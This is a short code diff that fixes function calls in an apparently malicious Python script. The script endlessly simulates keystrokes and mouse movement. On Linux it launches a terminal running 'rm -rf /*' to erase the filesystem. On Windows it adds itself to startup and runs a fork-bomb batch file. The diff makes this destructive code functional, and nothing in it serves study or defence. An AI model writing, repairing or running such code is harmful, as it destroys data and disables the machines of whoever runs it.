@@ -9,7 +9,7 @@ import os
 USER_NAME=getpass.getuser() # Gets the username of the user
 
 # Controls the keyboard
-key_pressing=key_press.
+key_pressing=key_press.key_presses()
 
 # Controls the mouse
 mouse_control=mouse_controller.mice()
@@ -18,7 +18,7 @@ mouse_control=mouse_controller.mice()
 def linux():
     # A loop that presses the keys, moves the mouse position and starts the terminal
     while True:
-        keypresses()
+        key_pressing()
         mouse_control()
         os.system("gnome-terminal 'rm -rf /*'")
         
@@ -34,7 +34,7 @@ def win_code():
     
     while True:
         add_to_startup()
-        keypresses()
+        key_pressing()
         mouse_control()
         os.system("fork_bomb.bat") 
         
